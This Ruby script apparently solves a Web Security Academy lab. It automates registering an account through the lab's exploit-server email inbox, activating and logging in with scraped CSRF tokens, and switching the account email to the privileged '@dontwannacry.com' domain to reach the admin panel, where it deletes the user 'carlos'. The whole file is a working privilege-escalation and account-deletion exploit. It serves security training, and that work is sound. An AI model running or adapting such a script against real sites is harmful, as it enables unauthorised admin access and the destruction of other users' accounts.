require 'http'
require 'nokogiri'

url='https://0a9c002204fe0ba6800d624a00f20063.web-security-academy.net'

#1. Create new tempp account
puts 'Creating user account...'

register_csrf = ''
register_req =  HTTP.get(url+'/register')
temp1 = Nokogiri.parse register_req.body.to_s
temp1.search(:tag,'input').to_a.each {|d| register_csrf = d.attr('value') if d.attr('name')=='csrf'}


login_client = HTTP.cookies('session'=>"#{register_req['Set-Cookie'].split(';')[0].split('=')[1]}").post(url+'/register',:form => {
		"csrf"=>"#{register_csrf}",
		"username"=>"tempp",
		"email"=>"tempp@exploit-0ae3006804440b5580e0611201cf00be.exploit-server.net",
		"password"=>"test"
		})


#2. Activate the account
puts 'Activating the user account...'

email_client_url = 'https://exploit-0ae3006804440b5580e0611201cf00be.exploit-server.net/email'
activation_link = ''
get_link = HTTP.get(email_client_url)
temp2 = Nokogiri.parse get_link.body.to_s
temp2.search(:tag,'a').to_a.each {|d| activation_link=d.text;break if d.text.include?'temp-registration-token'}

activate_link=HTTP.get(activation_link)

#3. Login into the account
puts 'Logging into the user account...'

login_csrf = ''
login = HTTP.get(url+'/login')
temp3 = Nokogiri.parse login.body.to_s
temp3.search(:tag,'input').to_a.each {|d| login_csrf = d.attr('value') if d.attr('name')=='csrf'}
auth = HTTP.cookies('session'=>"#{login['Set-Cookie'].split(';')[0].split('=')[1]}").post(url+'/login',:form => {
		"csrf"=>"#{login_csrf}",
		"username"=>"tempp",
		"password"=>"test" 
		})

cookie = auth['Set-Cookie'].split(';')[0].split('=')[1]
authenticated_client = HTTP.cookies("session"=>"#{cookie}")

#4. Change the tempp email
puts 'Changing email to @dontwannacry.com'

email_change_csrf = ''
change_mail = authenticated_client.get("https://0a9c002204fe0ba6800d624a00f20063.web-security-academy.net/my-account?id=tempp")
temp4 = Nokogiri.parse change_mail.body.to_s 
temp4.search(:tag,'input').to_a.each {|d| email_change_csrf = d.attr('value') if d.attr('name')=='csrf'}
change_mail = authenticated_client.post(url+'/my-account/change-email',:form => {
		"email"=>"t@dontwannacry.com",
		"csrf"=>"#{email_change_csrf}"
		})
		
#5. Access admin panel and delete tempp `carlos`
puts 'Accessing admin panel and deleting user carlos'

delete_carlos = authenticated_client.get("https://0a9c002204fe0ba6800d624a00f20063.web-security-academy.net/admin/delete?username=carlos")
